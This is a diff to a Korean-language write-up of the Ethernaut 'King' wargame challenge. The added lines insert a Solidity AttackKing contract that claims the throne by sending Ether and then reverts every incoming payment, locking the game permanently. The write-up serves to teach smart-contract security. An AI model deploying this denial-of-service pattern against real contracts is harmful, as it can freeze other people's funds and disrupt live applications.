@@ -76,8 +76,23 @@ contract King {
 
 CA는 receive함수를 설정하여 Ether를 받지 않고 revert 시킬 수 있다. 즉 만약 CA가 king이 되고 Ether를 받지 못하게 설정한다면 이제 누구도 게임을 진행 할 수 없게된다.
 
-attack contract를 한번 보며 더 이해해보자!
+attackKing contract를 한번 보며 더 이해해보자!
 
+```solidity
+contract AttackKing {
+
+    constructor() public payable {}
+    
+    //
+    function attackKing(address payable _king) public payable {
+      _king.call{value: msg.value}("");
+    }
+
+    fallback() external {
+        revert();
+    }
+}
+```
 
 - - -
 ## 기타 정보
